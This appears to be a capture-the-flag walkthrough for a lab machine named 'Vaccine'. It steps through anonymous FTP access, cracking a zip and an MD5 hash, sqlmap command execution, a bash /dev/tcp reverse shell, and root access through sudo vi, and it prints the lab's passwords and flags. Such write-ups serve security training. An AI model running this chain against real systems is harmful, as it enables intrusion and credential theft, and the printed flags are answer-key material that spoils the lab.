## Vaccine Solution

### Besides SSH and HTTP, what other service is hosted on this box?
1. Run an nmap scan with the `-sV` (version of services) `-sC`(default scripts for service discovery and vulnerability detection) 
   ```bash
   nmap -sV -sC {target_machine_ip}
   nmap -sC -sV 10.129.251.21
   ```
![Screenshot 2024-02-19 at 8 50 14 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/6e42d6b3-b7cf-4f42-978f-8213b6bb9f10)

**Answer: ftp**

### This service can be configured to allow login with any password for specific username. What is that username? 

As with the nmap results above the `sC` option was able to determine that **Anonymous FTP login allowed**. If you do a google search the username for this is usually `anonymous`

**anonymous**

### What is the name of the file downloaded over this service?

1. Let's connect via ftp

```bash
ftp {target_machine_ip}
```

2. For username just use `anonymous` and just enter blank password.
3. Enter `ls` and you will find `backup.zip`
4. Run `get backup.zip`

![Screenshot 2024-02-19 at 11 41 56 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/5a467605-0e2d-44f8-b10c-26c3235f9790)



**Answer: backup.zip**

### What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?

1. We try to unzip the backup.zip however a password is required.
   ![Screenshot 2024-02-20 at 12 00 57 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/ae3c46ff-0939-4956-8cc9-8d8c92440424)


2. Do a quick google search and you will find the answer

**Answer: zip2john** 


### What is the password for the admin user on the website?

1. Let's run the `zip2john` script to crack the password. First let's obtain the password hashes.
   ```bash
   zip2john backup.zip > zip.txt
   ```
 
   ![Screenshot 2024-02-20 at 11 08 05 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/1a4ac24e-c684-4583-8f3d-77fd3d0e2db3)

2. Then let's crack the password for the backup.zip
   ```bash
   john zip.txt   
   ```
   ![Screenshot 2024-02-20 at 11 08 56 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/ed883cff-3296-4b69-b6cb-88d6a3d2633a)


3. Now let's unzip backup.zip with the password `741852963`. This gives us two files `index.php` and `style.css`
   ```bash
   unzip backup.zip
   ```
![Screenshot 2024-02-20 at 11 10 22 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/d214ebb6-65ae-4578-ab97-ad4f922a922b)

4. Now let's investigate the index.php `vim index.php`. Here we find a hashed password `2cb42f8734ea607eefed3b70af13bbd3` for the username `admin`. 
   
![Screenshot 2024-02-20 at 11 21 43 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/89307436-b4f4-4097-8c85-98c40531cd06)

5. Let's analyze the hash type by going on any hash analyzer. We use [https://hashes.com/en/tools/hash_identifier](https://hashes.com/en/tools/hash_identifier) in this case and find that it is MD5 format.

   ![Screenshot 2024-02-20 at 11 35 10 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/f49117bb-77a6-4b85-beab-f66fc95b04db)


6. Create a file called `admin-hash.txt` then insert the hash found in the previous step. Let's crack the hash password using john
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 admin-hash.txt
```
![Screenshot 2024-02-20 at 11 42 25 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/39740423-3616-4cf0-a75f-c1af601dd2e7)


**Answer: qwerty789**


### What option can be passed to sqlmap to try to get command execution via the sql injection?

1. Login using username `admin` and password `qwerty789`
2. Go to browser and get the cookie `PHPSESSID` value
![Screenshot 2024-02-22 at 12 45 40 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/9954818a-ad05-4789-9292-8b6e202e1b8a)



3. Next as we view with the page after we login, we can see one possible form to attack with SQL injection. We observe that submitting it appends a query parameter `search`
![Screenshot 2024-02-22 at 12 49 49 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/6f874149-cb51-4d73-81a8-488be978f271)

4. Let's use sqlmap and run the following.

```bash
sqlmap -u "http://{target_ip}/dashboard.php?search=test" --cookie="PHPSESSID={cookie_value}"

sqlmap -u "http://{target_ip}/dashboard.php?search=test" --cookie="PHPSESSID={cookie_value}" --os-shell

```
5. We have spawned a os-shell with user postgres. However executing `sudo -l` does not yield any meaningful results. The os-shell is limited in commands it can execute. It is not interactive 

![Screenshot 2024-02-22 at 12 56 35 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/508193c6-850c-405d-89c9-8c13377c2e08)

5. Let's go to our attack machine and create a netcat listner server

```bash
  nc -lvnp 5000
```

6. On our target machine running sqlmap os-shell let's connect to our server to spawn a reverse shell.

```bash
 bash -c  "bash -i >& /dev/tcp/{attack_machine_ip}/5000  0>&1"

```

7. We have spawned a reverse shell however we do not have an interactive shell yet.
![Screenshot 2024-02-22 at 1 11 58 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/e4502837-7e73-4692-8d16-6c07b0d3aae5)

8. Run the following to have an interactive shell. 
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
stty raw -echo
export TERM=xterm
```

9. We now have an interactive shell. Hovever we have to know the password of user `postgres` to run `sudo -l`
    
![Screenshot 2024-02-22 at 2 00 25 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/f39b4b0a-70c7-45ab-954f-325620f72896)

10. We have to find the password in the system. And since this server running a website, one of the places we can look at is `/var/www/`
![Screenshot 2024-02-22 at 2 26 14 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/60fdfdc5-b94d-487a-8b70-c05438972859)

11. Let's explore each of the files in the `html` folder. Under the `dashboard.php` file we find. 

![Screenshot 2024-02-22 at 2 32 15 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/2582d9ed-becf-4bd2-be03-eb392cde88b0)


12. We test this password by using it for the password prompt for `sudo -l` Where we find that we have sudo rights for vi program.

![Screenshot 2024-02-22 at 2 10 53 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/752994b0-6b2d-4cf4-9aa4-9fa83b68a295)

**Answer: vi** 

### Submit user flag

1. Our connection via reverse shell is always being disconnected from the server. Since we know the password (P@s5w0rd! of the user `postgres`, let's just connect via ssh.
   ```bash
   ssh postgres@{target_machine_ip}
   ```

2.  Run `cd ~/` to go to `postgres` user's folder to see if there is something interesting. In here we will find `user.txt`

![Screenshot 2024-02-22 at 2 49 00 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/09726c3d-4635-4b0d-9f71-86de6ab0e1f9)

**Answer:ec9b13ca4d6229cd5cc1e09980965bf7**

### Submit the root flag

1. Continuing with our terminal established via ssh connnection in the previous section. We know that our current `postgres` user has sudo privileges for `vi`. Now let's attempt priviledge escalation.
   
2. Let's go to [https://gtfobins.github.io/gtfobins/vi/#shell](https://gtfobins.github.io/gtfobins/vi/#shell) to check if we can run a command to escalte our privileges to root.
   
3. Run the following:
   ```bash
    sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
   ```
   ![Screenshot 2024-03-10 at 4 29 43 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/4b7fc1a9-452d-4b4f-a3cc-3926f46aa5ac)
   
4. Then execute the following from inside vi based on GTFOBins
   ```bash
   :set shell=/bin/sh
   :shell
   ```
5. Now we have escalated our privileges and have a shell with root privileges. Now let's look for `root.txt`
   ```
   find / -type f -name "root.txt"
   ```
![Screenshot 2024-03-10 at 4 33 06 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/2666f836-1ec0-4d42-8533-ed61a4eb84cf)

   
6. Now let's look at the file to get flag
   ```bash
   vi /root/root.txt
   ```
**Answer: ddd6e058e814260bc70e9bbdef2715849**
